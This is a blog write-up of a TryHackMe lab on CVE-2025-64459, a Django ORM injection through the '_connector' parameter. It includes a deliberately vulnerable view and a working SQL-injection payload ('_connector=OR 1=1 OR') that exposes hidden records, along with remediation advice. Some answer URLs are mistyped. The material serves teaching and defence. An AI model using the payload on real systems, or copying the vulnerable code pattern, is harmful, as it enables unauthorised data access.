---
title: "Django: CVE-2025-64459 (TryHackMe)"
datePublished: Mon Feb 16 2026 20:15:29 GMT+0000 (Coordinated Universal Time)
cuid: cmlpm63ds000402l1a6sb98hp
slug: django-cve-2025-64459-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1771239193182/fef004b9-a3c7-4e35-a71f-25df5508196d.png
tags: cybersecurity, tryhackme, exploitation, queryparameters, django-cve, cve-2025-64459

---

## Introduction

Django is a widely used Python web framework that exposes Object-Relational Mapping (ORM) layer to let developers query databases using familiar Python syntax. That convenience becomes a liability when user input is fed straight into ORM calls without validation. In particular, some applications expand request parameter dictionaries directly into `filter()`, `exclude()` or `get()` calls. For example, `filter(**request.GET.dict())` inadvertently allows an attacker to supply internal query-control parameters.

![Illustration of a syringe injecting red fluid into a database server icon, symbolizing a SQL injection attack compromising the integrity of the database.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1763407472026.png align="left")

A critical vulnerability exists where specially crafted query parameters such as `_connector` and `_negated` can be injected into those ORM calls. By manipulating how query clauses are combined or inverted, an attacker can alter the logical structure of database queries leading to unauthorised data access, authentication bypasses, or privilege escalation. The issue is high-severity (CVSS ~9.1) and straightforward to exploit in many common coding patterns.

This room will explain what makes the flaw possible, show how to identify the risky code pattern in a codebase, demonstrate practical exploitation in an isolated lab environment, and walk through remediation and detection strategies so the same mistake is not repeated in production.

## Technical Details

Django's Object-Relational Mapping (ORM) layer allows developers to build database queries using familiar Python syntax instead of raw SQL. Queries are usually constructed with methods such as `filter()`, `exclude()`, and `get()`, which accept keyword arguments (`**kwargs`) to define conditions. For example, calling `User.objects.filter(username='admin')` generates an SQL statement that searches for a user named *admin*.

This flexibility can become dangerous when untrusted input is expanded directly into these ORM calls. Some developers take request parameters from the client, convert them into a dictionary, and pass them into the ORM. For example, `User.objects.filter(**request.GET.dict())`. While this shortcut may seem convenient, it allows attackers to supply not only legitimate field names but also Django's **internal query arguments**.

Before the security patch, two of these internal parameters (`_connector` and `_negated`) were not properly restricted.

* The `_connector` parameter defines how multiple query conditions are joined, such as `AND` or `OR`. By manipulating this, an attacker could change the logical relationship between clauses. For example, turning a strict login check into an `OR` condition that always returns true.
    
* The `_negated` parameter inverts a query, allowing an attacker to flip a filter's meaning. For example, a query meant to return non-admin users could be inverted to return only admin users.
    

When these internal parameters are supplied by user input, the ORM no longer enforces the intended query logic. As a result, attackers can craft malicious requests that bypass authentication, extract data, or alter records they should not have access to.

The official fix prevents `_connector` and `_negated` from being accepted through external input. Django now validates these values at the `QuerySet` layer and ensures that `_connector` is only set internally on `Q` objects. Patched releases include all maintained versions of Django—developers should upgrade immediately to a secure version to mitigate this issue.

## Exploitation

We have built a basic lab inspired by [Shivasurya’s example code](https://shivasurya.me/security/django/2025/11/07/django-sql-injection-CVE-2025-64459.html). Below is a snippet from the back-end code; pay close attention to `q_filter = Q(**query_params)`.

```python
def post_list(request):
  query_params = dict(request.GET.items())
  if not any(param.startswith('is_published') for param in query_params.keys()):
      query_params['is_published'] = True
  if not any(param.startswith('id') for param in query_params.keys()):
      query_params['id__lt'] = 10
  q_filter = Q(**query_params)
  posts = Post.objects.filter(q_filter)
```

To begin the demonstration, open the AttackBox and navigate to the Blog Posts PoC at `http://MACHINE_IP:8000/poc/` in your browser. The page should display three posts, as shown in the screenshot below.

![Screenshot of a web page showing a Django security vulnerability demonstration and three posts.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1763405001772.png align="left")

This demonstration is for educational purposes. We have provided various query parameters that you can add to the URL when accessing the Blog Posts page. Use these parameters in the web address bar to customize your search results. These are included to help you experiment and understand how query parameters affect Django web applications in relation to this vulnerability.

* `?title=Some Title` - to filter by title
    
* `?author=Some Author` - to filter by author
    
* [`?`](https://shivasurya.me/security/django/2025/11/07/django-sql-injection-CVE-2025-64459.html)`title__icontains=draft` - use Django lookup expressions (like `__icontains`)
    
* `?created_date__year=2024` - filter by parts of the date
    

**Discovering all the Posts**

Let’s say you want to display posts by a specific author, for example, all posts by “Security Architect”. This can be achieved by appending `?author=Security%20Architect` to the URL, for example, `http://MACHINE_IP:8000/poc/?author=Security%20Architect`. In this case, this returned a single post.

![Screenshot of a web page showing a Django security vulnerability demonstration and one post.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1763405028598.png align="left")

If the target VM is vulnerable, you can exploit this vulnerability by getting all the posts saved within the database. This can be achieved by manipulating the `_connector` parameter to inject an SQL condition, allowing us to retrieve all the posts. One working example is to set `_connector` to `OR 1=1 OR`, which will result in a match for all posts by all authors, including non-public posts. As one can tell, this falls under data exfiltration. The constructed URL is `http://MACHINE_IP:8000/poc/?author=Security%20Architect&_connector=OR%201=1%20OR`.

![Screenshot of a web page showing a Django security vulnerability demonstration and all blog posts](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1763405235123.png align="left")

**Discovering all the Employees**

After completing the previous steps, answer the first question. To answer the second question, open your browser and go to `http://MACHINE_IP:8000/poc/employees`. Use a similar process as before to locate the answer.

### Answer the questions below

1. What is the title of the post by “DevOps Engineer”?  
      
    `http://MACHINE_IP:8000/poc/employees`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1771237628970/3f6f1279-f91f-41c2-87b6-f9dfd48264d0.png align="center")
    
    `http//MACHINE_IP:8000/poc`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1771237661894/1dc8b42e-9ff5-4da0-8a48-b3f95732869b.png align="center")
    
    `http//MACHINE_IP:8000/poc/?author=Security%20Architect`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1771237688088/67658ea1-b3bd-48ff-933d-2f056319ad13.png align="center")
    
    `http//MACHINE_IP:8000/poc/?author=Security%20Architect&_connector=OR%201=120OR`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1771237708172/1327aa68-8642-4d34-ab25-bf37b398c7d0.png align="center")
    
2. Browse to http://MACHINE\_IP:8000/poc/employees. What is the name of the employee whose hire date is “June 5, 2022”?  
      
    `http//MACHINE_IP:8000/poc/employees/?hire_date__year=2022`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1771237984679/50cf5be1-0b30-4233-a766-f5052bf61f30.png align="center")
    
    `http//MACHINE_IP:8000/poc/?hire_date=2022&_connector=OR%201=1%20OR`
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1771238001196/7f9e5dcb-c999-418e-a37d-9ab71dc2ad37.png align="center")

## Conclusion

This vulnerability only requires an application pattern that expands untrusted request parameters into ORM calls (e.g. `filter(**request.GET.dict())`) - no exotic privileges are needed. The exploit is subtle and can resemble normal traffic, making detection difficult. Upgrade Django to a patched release (for affected maintained branches) as the primary fix; if upgrading immediately is infeasible, block or log requests containing the internal keys (`_connector`, `_negated`) at the edge (WAF/proxy) or add application middleware that rejects those parameters and enforce a whitelist for allowed filter fields.

Answer the questions below

If you enjoyed this room, check the other rooms in the [Recent Threats](https://tryhackme.com/module/recent-threats) module.